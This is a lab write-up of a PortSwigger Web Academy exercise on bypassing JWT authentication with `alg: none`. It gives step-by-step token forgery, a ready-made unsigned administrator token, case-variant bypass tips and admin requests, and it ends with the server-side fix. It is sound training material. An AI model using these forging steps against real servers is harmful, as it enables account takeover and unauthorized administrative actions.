# JWT Authentication Bypass via `alg: none`

**Platform:** PortSwigger Web Academy  
**Category:** JWT Attacks  
**Difficulty:** Apprentice  
**Lab URL:** https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification  

---

## Objective

Access the `/admin` panel and delete the user `carlos` by exploiting a server that accepts unsigned JWTs when `alg` is set to `none`.

---

## Background

The JWT header contains an `alg` field that tells the server which algorithm was used to sign the token:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The JWT specification includes `"none"` as a valid algorithm — meaning **no signature is required**. This was intended only for non-security-critical contexts. The problem: some servers accept `alg: none` from client-supplied tokens, which means an attacker can strip the signature entirely and forge any payload they want.

---

## Tools Used

- Burp Suite (Proxy + Repeater)
- JWT Editor extension (or manual Base64URL encoding)

---

## Steps

### 1. Log in and capture the JWT

Log in with:  
- Username: `wiener`  
- Password: `peter`

Copy the session JWT from the cookie. Paste it into Burp's JWT editor or decode it manually.

Original header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Original payload:

```json
{
  "iss": "portswigger",
  "sub": "wiener",
  "exp": 1720000000
}
```

---

### 2. Modify the header — set `alg` to `none`

Change the `alg` field:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

> **Note:** Some servers only check for exact lowercase `"none"`. If that doesn't work, try variations: `"None"`, `"NONE"`, `"nOnE"` — some validation checks are case-sensitive.

---

### 3. Modify the payload — escalate to administrator

```json
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1720000000
}
```

---

### 4. Reconstruct the token — remove the signature

A valid JWT has three parts: `header.payload.signature`

When using `alg: none`, there is **no signature** — but the trailing dot must still be present:

```
<modified_header_b64>.<modified_payload_b64>.
```

Manual reconstruction:
1. Base64URL encode the modified header (no `=` padding)
2. Base64URL encode the modified payload (no `=` padding)
3. Concatenate with dots, leaving the signature section **empty**:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE3MjAwMDAwMDB9.
```

The trailing dot is critical — without it the token format is invalid.

---

### 5. Send to `/admin` and delete carlos

Replace the session cookie with your forged token and send:

```
GET /admin HTTP/1.1
Cookie: session=<forged_token>
```

You should get `200 OK`. Then send:

```
GET /admin/delete?username=carlos
```

Lab solved.

---

## Why This Works

The server reads the `alg` field from the **client-supplied header** and uses it to decide how to verify the token. When it sees `alg: none`, it skips verification entirely. This means the server is trusting the attacker's own instruction on how (not) to verify the token.

Correct behavior: the server should **hardcode** which algorithm it accepts. It should never read `alg` from the token and blindly trust it. The `alg: none` option should be explicitly rejected.

---

## Key Differences from Lab 01

| Lab 01 (Unverified Signature) | Lab 02 (alg: none) |
|---|---|
| Server ignores signature entirely | Server reads `alg` from header and obeys it |
| Original signature kept in place | Signature completely removed |
| No header modification needed | Must change `alg` field to `"none"` |
| Simpler misconfiguration | Exploits a flaw in algorithm handling logic |

Both labs share the same end result — forged payload, no cryptographic verification — but the attack vector is different.

---

## Key Takeaway

> **Never let client-supplied data control your security logic.** The `alg` field in the JWT header is attacker-controlled. A server that obeys `alg: none` from an inbound token is letting the attacker turn off its own security checks. Always validate tokens against a server-side hardcoded algorithm.

---
